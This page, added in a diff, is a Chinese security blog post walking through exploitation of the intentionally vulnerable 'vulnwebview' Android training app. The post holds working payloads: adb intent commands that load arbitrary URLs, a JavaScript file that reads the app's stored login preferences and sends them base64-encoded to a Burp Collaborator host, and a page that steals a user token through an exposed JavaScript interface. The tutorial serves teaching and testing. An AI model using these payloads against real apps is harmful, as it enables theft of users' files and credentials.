@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>利用Android Webview漏洞 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">利用Android Webview漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">八月 16, 2023&nbsp;&nbsp;21:23:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="利用Android-WebView漏洞"><a href="#利用Android-WebView漏洞" class="headerlink" title="利用Android WebView漏洞"></a>利用Android WebView漏洞</h1><h2 id="0x00-说明"><a href="#0x00-说明" class="headerlink" title="0x00 说明"></a>0x00 说明</h2><p>测试程序来源：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/t4kemyh4nd/vulnwebview">https://github.com/t4kemyh4nd/vulnwebview</a></p>
+<p>可以直接下载app.apk进行测试</p>
+<p>下载安装后打开长下面的样子，Username：vuln Password：webview</p>
+<p>需要登录一下</p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/1.png" alt="img"></p>
+<h2 id="0x01-Android-WebView说明"><a href="#0x01-Android-WebView说明" class="headerlink" title="0x01 Android WebView说明"></a>0x01 Android WebView说明</h2><p>WebView是Android类的扩展，允许将网页显示在Activity页面布局中，但是没有所有的Web浏览器的功能，如导航栏或者地址栏。默认只显示一个网页。</p>
+<h2 id="0x02-导出的WebView"><a href="#0x02-导出的WebView" class="headerlink" title="0x02 导出的WebView"></a>0x02 导出的WebView</h2><p>利用导出的WebView，可以进行WebView劫持，常见的就是开放重定向漏洞，利用条件webview所在的Activity需要是导出的</p>
+<p>如何判断导出，有两种方式：</p>
+<ul>
+<li>显示的声明android:exported&#x3D;”true”</li>
+<li>使用intent filters并且没有显示的声明android:exported&#x3D;”false”</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/2.png" alt="img"></p>
+<p>RegistrationWebView是显示导出的，MainActivity是intent filters导出的。</p>
+<p>分析受害者代码：</p>
+<p>RegistrationWebView</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package com.tmh.vulnwebview;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import android.webkit.ConsoleMessage;</span><br><span class="line">import android.webkit.WebChromeClient;</span><br><span class="line">import android.webkit.WebView;</span><br><span class="line">import android.webkit.WebViewClient;</span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line">/* loaded from: classes.dex */</span><br><span class="line">public class RegistrationWebView extends AppCompatActivity &#123;</span><br><span class="line">    /* JADX INFO: Access modifiers changed from: protected */</span><br><span class="line">    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br><span class="line">    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_registration_web_view);</span><br><span class="line">        setTitle(&quot;Registration page&quot;);</span><br><span class="line">        loadWebView();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void loadWebView() &#123;</span><br><span class="line">        WebView webView = (WebView) findViewById(R.id.webview);</span><br><span class="line">        webView.setWebChromeClient(new WebChromeClient() &#123; // from class: com.tmh.vulnwebview.RegistrationWebView.1</span><br><span class="line">            @Override // android.webkit.WebChromeClient</span><br><span class="line">            public boolean onConsoleMessage(ConsoleMessage consoleMessage) &#123;</span><br><span class="line">                Log.d(&quot;MyApplication&quot;, consoleMessage.message() + &quot; -- From line &quot; + consoleMessage.lineNumber() + &quot; of &quot; + consoleMessage.sourceId());</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        webView.setWebViewClient(new WebViewClient());</span><br><span class="line">        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">        if (getIntent().getExtras().getBoolean(&quot;is_reg&quot;, false)) &#123;</span><br><span class="line">            webView.loadUrl(&quot;file:///android_asset/registration.html&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            webView.loadUrl(getIntent().getStringExtra(&quot;reg_url&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到loadWebView方法获取传输过来的reg_url参数的值，直接在webview中加载，上面代码没有任何过滤可以直接用于开放重定向。</p>
+<p>利用：</p>
+<p>可以使用adb进行利用，传输参数打开恶意网页。</p>
+<p>概念利用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n componentname --es string &quot;domain.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>实际利用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url &quot;https://attack.com&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url &quot;https://www.baidu.com&quot;</span><br><span class="line">Starting: Intent &#123; cmp=com.tmh.vulnwebview/.RegistrationWebView (has extras) &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/3.png" alt="img"></p>
+<p>注意：上述方法仅在直接导出组件时才有效，不适用Intent filters导出的组件。</p>
+<h2 id="0x03-WebView启用setAllowUniversalAccessFromFileURLs"><a href="#0x03-WebView启用setAllowUniversalAccessFromFileURLs" class="headerlink" title="0x03 WebView启用setAllowUniversalAccessFromFileURLs"></a>0x03 WebView启用setAllowUniversalAccessFromFileURLs</h2><p>开启setAllowUniversalAccessFromFileURLs(可以访问文件)，配合开启setJavaScriptEnabled(可以运行js脚本)选项，在加上导出的WebView，可以导致攻击者读取任意文件漏洞。</p>
+<p>分析代码：</p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/4.png" alt="img"></p>
+<p>上面代码已经开启了选项</p>
+<p>利用：</p>
+<p>尝试读取本地文件存储的登录信息。使用Burp Collaborator client接收登录信息</p>
+<p>susafu.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var url=&#x27;file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml&#x27;//本地文件路径</span><br><span class="line">	function load(url)&#123;</span><br><span class="line">		var xhr=new XMLHttpRequest();</span><br><span class="line">		xhr.onreadystatechange = function()&#123;</span><br><span class="line">			if(xhr.readyState === 4)&#123;</span><br><span class="line">				fetch(&#x27;https://bjyuns1ez806dh912ethipox4oafy4.burpcollaborator.net/?exfiltrated=&#x27;+btoa(xhr.responseText));//发送 b64 encoded文件给攻击者</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		xhr.open(&#x27;GET&#x27;,url,true);</span><br><span class="line">		xhr.send(&#x27;&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">	load(url)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用adb把sauafu.html移动到sd卡中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ adb push sauafu.html /sdcard/</span><br><span class="line">sauafu.html: 1 file pushed, 0 skipped. 1.0 MB/s (467 bytes in 0.000s)</span><br></pre></td></tr></table></figure>
+
+<p>尝试运行利用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url &quot;file:///sdcard/sauafu.html&quot;</span><br><span class="line">Starting: Intent &#123; cmp=com.tmh.vulnwebview/.RegistrationWebView (has extras) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后会打开一个空页面,然后查看burp中接收的信息</p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/5.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/6.png" alt="img"></p>
+<p>然后burp collaborator成功收到请求，解密后就是登录信息</p>
+<h2 id="0x04-WebView启用JavaScript选项"><a href="#0x04-WebView启用JavaScript选项" class="headerlink" title="0x04 WebView启用JavaScript选项"></a>0x04 WebView启用JavaScript选项</h2><p>开发可以使用以下配置启用javascript</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.getSettings().setJavaScriptEnabled(true);</span><br></pre></td></tr></table></figure>
+
+<p>添加下面配置会在网页的java script脚本和应用程序的客户端java代码之间创建接口。即，网页的javascript脚本可以访问原生的java代码并将代码注入到程序中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(new WebAppInterface(this), &quot;Android&quot;);  </span><br></pre></td></tr></table></figure>
+
+<p>如果当前的Activity是导出的并允许攻击者执行攻击，可能导致XSS和token盗取。</p>
+<p>受害代码：</p>
+<p>SupportWebView</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.tmh.vulnwebview;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.webkit.WebChromeClient;</span><br><span class="line">import android.webkit.WebView;</span><br><span class="line">import android.webkit.WebViewClient;</span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.UUID;</span><br><span class="line"></span><br><span class="line">/* loaded from: classes.dex */</span><br><span class="line">public class SupportWebView extends AppCompatActivity &#123;</span><br><span class="line">    /* JADX INFO: Access modifiers changed from: protected */</span><br><span class="line">    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br><span class="line">    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_support_web_view);</span><br><span class="line">        setTitle(&quot;Support&quot;);</span><br><span class="line">        loadWebView();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void loadWebView() &#123;</span><br><span class="line">        WebView webView = (WebView) findViewById(R.id.webview2);</span><br><span class="line">        webView.setWebChromeClient(new WebChromeClient());</span><br><span class="line">        webView.setWebViewClient(new WebViewClient());</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">        Map&lt;String, String&gt; extraHeaders = new HashMap&lt;&gt;();</span><br><span class="line">        extraHeaders.put(&quot;Authorization&quot;, getUserToken());</span><br><span class="line">        webView.addJavascriptInterface(new WebAppInterface(this), &quot;Android&quot;);</span><br><span class="line">        webView.loadUrl(getIntent().getStringExtra(&quot;support_url&quot;), extraHeaders);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String getUserToken() &#123;</span><br><span class="line">        String uuid = UUID.randomUUID().toString();</span><br><span class="line">        return uuid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码可以看到已经启用javascript，还有定义的接口声明Android</p>
+<p>WebAppInterface</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.tmh.vulnwebview;</span><br><span class="line"></span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.webkit.JavascriptInterface;</span><br><span class="line"></span><br><span class="line">/* loaded from: classes.dex */</span><br><span class="line">public class WebAppInterface &#123;</span><br><span class="line">    Context mContext;</span><br><span class="line"></span><br><span class="line">    /* JADX INFO: Access modifiers changed from: package-private */</span><br><span class="line">    public WebAppInterface(Context c) &#123;</span><br><span class="line">        this.mContext = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @JavascriptInterface</span><br><span class="line">    public String getUserToken() &#123;</span><br><span class="line">        return SupportWebView.getUserToken();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接口的内容是获取usertoken</p>
+<p>攻击代码:</p>
+<p>token.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	document.write(&quot;token:&quot;+Android.getUserToken());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上脚本是从Android接口调用getUserToken方法并写入token</p>
+<p>本地启动web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p>可以使用下面链接访问token.html</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.4:8888/token.html">http://192.168.1.4:8888/token.html</a></p>
+<p>攻击命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url &quot;http://192.168.1.4:8888/token.html&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/7.png" alt="img"></p>
+<p>上面造成token获取</p>
+<p>也可以进行xss攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	alert(&quot;kal&quot;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/71/8.png" alt="img"></p>
+<h2 id="LINK"><a href="#LINK" class="headerlink" title="LINK"></a>LINK</h2><p><a target="_blank" rel="noopener" href="https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892">利用 Android WebView 漏洞</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/2112214829.html">http://tea9.xyz/post/2112214829.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/android%E5%AE%89%E5%85%A8/"># android安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/379246801.html">公开web漏洞报告逻辑分析整理[持续更新]</a>
+            
+            
+            <a class="next" rel="next" href="/post/1495034172.html">Android webview漏洞</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
